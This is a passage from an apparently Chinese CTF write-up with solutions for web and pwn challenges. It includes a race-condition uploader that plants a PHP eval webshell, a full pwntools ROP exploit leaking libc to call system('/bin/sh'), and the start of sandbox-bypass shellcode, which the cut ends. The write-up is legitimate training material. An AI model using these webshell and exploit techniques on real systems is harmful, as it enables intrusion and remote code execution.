+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">html</span> <span class="o">=</span> <span class="k">await</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;href=&#34;([^&#34;]+\.php)&#34;&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">matches</span> <span class="k">if</span> <span class="n">matches</span> <span class="k">else</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error finding PHP routes: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">check_php_file</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">file_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;异步检查 PHP 文件是否可访问&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 确保 URL 是完整的</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">file_url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">file_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">file_url</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">file_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Success! </span><span class="si">{</span><span class="n">file_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed to access: </span><span class="si">{</span><span class="n">file_url</span><span class="si">}</span><span class="s2"> (status code: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error accessing </span><span class="si">{</span><span class="n">file_url</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;主任务：发现并访问 PHP 文件&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">connector</span> <span class="o">=</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">TCPConnector</span><span class="p">(</span><span class="n">limit</span><span class="o">=</span><span class="n">MAX_CONCURRENT_REQUESTS</span><span class="p">)</span>  <span class="c1"># 设置并发限制</span>
+</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">(</span><span class="n">connector</span><span class="o">=</span><span class="n">connector</span><span class="p">)</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 异步发现 PHP 文件</span>
+</span></span><span class="line"><span class="cl">            <span class="n">php_files</span> <span class="o">=</span> <span class="k">await</span> <span class="n">find_php_route</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">BASE_URL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">php_files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Found PHP routes:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">php_file</span> <span class="ow">in</span> <span class="n">php_files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">php_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">php_file</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">php_file</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;http&#34;</span><span class="p">)</span> <span class="k">else</span> <span class="n">php_file</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34; - </span><span class="si">{</span><span class="n">php_url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1"># 异步并发检查所有发现的 PHP 文件</span>
+</span></span><span class="line"><span class="cl">                <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="n">check_php_file</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">php_file</span><span class="p">)</span> <span class="k">for</span> <span class="n">php_file</span> <span class="ow">in</span> <span class="n">php_files</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1"># 如果任何一个文件可访问，则停止</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">results</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Successfully accessed a PHP file. Exiting.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></span></code></pre></div><p>bp 在进行发包，线程调整到 200，传入内容如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">folder</span> <span class="o">=</span> <span class="s2">&#34;Uploads/127.0.0.1/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">is_dir</span><span class="p">(</span><span class="err">$</span><span class="n">folder</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mkdir</span><span class="p">(</span><span class="err">$</span><span class="n">folder</span><span class="p">,</span> <span class="mi">0755</span><span class="p">,</span> <span class="n">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">filename</span> <span class="o">=</span> <span class="err">$</span><span class="n">folder</span> <span class="o">.</span> <span class="s2">&#34;111.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo();@eval(\$_POST[&#39;cmd&#39;]); ?&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_put_contents</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">,</span> <span class="err">$</span><span class="n">content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;File $filename has been created with webshell content in folder $folder.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154106212-687839310.png" alt="image-20250303154102024"></p>
+<p>写入的同时访问，最终成功，用蚁剑连接可得 flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154118712-281379835.png" alt="image-20250303154114506"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154134430-68076412.png" alt="image-20250303154130440"></p>
+<h1 id="reverse">
+<a class="header-anchor" href="#reverse"></a>
+Reverse
+</h1><p>rev不出来，这逆向题太有意思了，遗憾退场</p>
+<h1 id="pwn">
+<a class="header-anchor" href="#pwn"></a>
+Pwn
+</h1><h2 id="vpwn">
+<a class="header-anchor" href="#vpwn"></a>
+Vpwn
+</h2><p>c++题目</p>
+<p>审读代码，有四个功能，push，pop，edit和show</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154159430-223255095.png" alt="image-20250303154155140"></p>
+<p>调试发现，push8次，之后show的话会外带出来libc地址，这里接受转换一下，并计算偏移得到libc地址</p>
+<p>之后edit就是本题的关键，这里存在数组溢出，并对我们输入数据进行一个加密，我们需要写加密一下paylaod，之后利用</p>
+<p>溢出走system的rop链子，劫持程序流程，getshell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154204872-1708182323.png" alt="image-20250303154200848"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154209449-699283542.png" alt="image-20250303154205479"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154213847-1866135337.png" alt="image-20250303154209902"></p>
+<p>成功劫持程序流程，执行我们的payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154219385-433703884.png" alt="image-20250303154215153"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">r</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inter</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_addr64</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_addr32</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_sys</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_hook</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">],</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="c1">#libc = ELF(&#39;./libc.so.6&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#39;139.155.126.78&#39;,25416)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">rl</span><span class="p">(</span><span class="s2">&#34;Enter your choice: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rl</span><span class="p">(</span><span class="s2">&#34;Enter the value to push: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;666&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rl</span><span class="p">(</span><span class="s2">&#34;StackVector contents: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">rl</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">19</span><span class="p">])</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">18</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">libc_addr</span><span class="o">-</span><span class="mh">0x29d90</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span><span class="p">,</span><span class="n">bin_sh</span><span class="o">=</span><span class="n">get_sys</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;pop rdi</span><span class="se">\n</span><span class="s2">ret&#34;</span><span class="p">))</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_entry</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;edit&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;value&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">split_data</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">part</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">part</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mh">0x7FFFFFFF</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">-=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">rdi</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">21</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">rdi</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">23</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">system</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">update_entry</span><span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="n">split_data</span><span class="p">(</span><span class="n">system</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#bug()</span>
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">inter</span><span class="p">()</span>	
+</span></span></code></pre></div><h2 id="heavens-door">
+<a class="header-anchor" href="#heavens-door"></a>
+Heaven&rsquo;s door
+</h2><p>查一手保护，开了NX没有PIE</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154227692-430847096.png" alt="image-20250303154223735"></p>
+<p>看下源码，明显有沙箱</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154231959-603529432.png" alt="image-20250303154227990"></p>
+<p>直接先运行跑一下看看怎么事儿，有一堆字符串之后有输入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154236280-803911230.png" alt="image-20250303154232281"></p>
+<p>结合源码，发现让我们读入shellcode，但明显开了沙盒，查一下禁用了什么函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154240740-1693565750.png" alt="image-20250303154236720"></p>
+<p>看沙盒的话是只允许使用这几个函数，并且syscall只能用三次，抱着试试的心态，用了openat+sendfile试了试，直接出了，怀疑是题目出的有点问题</p>
+<p>exp:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ae64</span> <span class="kn">import</span> <span class="n">AE64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bug</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;139.155.126.78&#39;</span><span class="p">,</span><span class="mi">30794</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;    
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x67616c662f2e
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">    sub rdi, 100
